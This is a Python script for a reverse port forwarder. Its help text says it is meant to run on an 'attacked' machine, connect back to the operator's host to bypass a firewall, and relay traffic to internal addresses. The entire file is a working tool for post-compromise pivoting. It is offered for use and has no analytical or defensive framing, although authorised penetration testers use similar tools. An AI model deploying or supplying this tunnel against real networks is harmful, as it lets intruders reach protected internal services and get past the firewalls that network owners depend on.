#!/bin/python3

import socket
import time
import sys
import threading
import argparse


BUFFER_SIZE = 0x400


def establish_connection(address):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    while True :
        try :
            client_socket.connect(address)
            break
        except :
            time.sleep(1)

    return client_socket


def renew_socket(old_socket, address) :
    old_socket.shutdown(socket.SHUT_RDWR)
    old_socket.close()
    return establish_connection(address)


# tunnel connection should be always alive and so should never launch error
# if tunnel connection drop you should restart the program
def tunnel2forward() :
    global forward_socket

    while True :
        data = tunnel_socket.recv(BUFFER_SIZE)
        if not data :
            raise Exception("Tunnel has dropped, this shouldn't happen, restart RPPF.")

        try :
            sending_socket_lock.acquire()
            forward_socket.sendall(data)
            sending_socket_lock.release()

        except Exception :
            sending_socket_lock.release()

            # locking other threads
            receiving_socket_lock.acquire()
            sending_socket_lock.acquire()
            forward_socket = renew_socket(forward_socket, forward_address)
            sending_socket_lock.release()
            receiving_socket_lock.release()

            forward_socket.sendall(data)


def forward2tunnel() :
    global forward_socket

    while True :
        receiving_socket_lock.acquire()
        data = forward_socket.recv(BUFFER_SIZE)
        receiving_socket_lock.release()

        if not data :
            # locking other threads
            receiving_socket_lock.acquire()
            sending_socket_lock.acquire()
            forward_socket = renew_socket(forward_socket, forward_address)
            sending_socket_lock.release()
            receiving_socket_lock.release()
            continue

        try :
            tunnel_socket.sendall(data)
        except Exception as e :
            raise Exception("Tunnel has dropped, this shouldn't happen, restart RPPF.")


parser = argparse.ArgumentParser(
        formatter_class=argparse.RawTextHelpFormatter, 
        description=
        u'''
----------------------------------------
 Python Reverse Port Forwarder (Remote)
----------------------------------------
Welcome to the PRPF, a simple port forwarder written in python.
This code should be running on the remote (attacked) machine.
A tunnel will be created to the thost:tport address using a reverse 
connection logic, to bypass firewall. The data coming from the tunnel
will then be sent over a new connection to the forward address.
The tunnel address should be your PRPF local tunnel address.
Example : ./remote_portfwd.py localhost:4444 google.com:80
----------------------------------------
* Only tcp protocol supported *

     __                          __
    |==|                        |==|
    |= |                        |= |
    |^*|  ----\u2620----\u2620----\u2620----   |^*|
    |__|                        |__|
        ''')



parser.add_argument("tunnel_address", metavar="thost:tport", type=str, help="Your local address to be contacted")
parser.add_argument("forward_address", metavar="fhost:fport", type=str, help="The remote address to forward to")

args = parser.parse_args()

tunnel_hostname, tunnel_port = args.tunnel_address.split(':')
tunnel_address = (tunnel_hostname, int(tunnel_port))
forward_hostname, forward_port = args.forward_address.split(':')
forward_address = (forward_hostname, int(forward_port))


try :
    print("creating tunnel to " + str(tunnel_address))
    tunnel_socket = establish_connection(tunnel_address)
    print("tunnel created")

    print("opening forward connection to " + str(forward_address))
    forward_socket = establish_connection(forward_address)
    print("connection created")
    print("--------------------------------------------")
    print("Ready to transfer data")
    

    # start thread for incoming and outcoming traffic
    tunnel2forward_t = threading.Thread(target=tunnel2forward)
    forward2tunnel_t = threading.Thread(target=forward2tunnel)
    tunnel2forward_t.daemon = True
    forward2tunnel_t.daemon = True

    # create thread lock semaphore for changes on forward socket
    sending_socket_lock = threading.Lock()
    receiving_socket_lock = threading.Lock()

    tunnel2forward_t.start()
    forward2tunnel_t.start()
    
    tunnel2forward_t.join()
    forward2tunnel_t.join()

except KeyboardInterrupt :
    # close sockets after SIGINT
    print('\nClosing connections')
    tunnel_socket.shutdown(socket.SHUT_RDWR)
    tunnel_socket.close()
    forward_socket.shutdown(socket.SHUT_RDWR)
    forward_socket.close()
    print('\nStopped correctly')
    sys.exit(0)

except Exception as e :
    print('An exception occurred')
    print(e)
    print('Trying to close sockets')
    tunnel_socket.shutdown(socket.SHUT_RDWR)
    tunnel_socket.close()
    forward_socket.shutdown(socket.SHUT_RDWR)
    forward_socket.close()
    sys.exit(1)
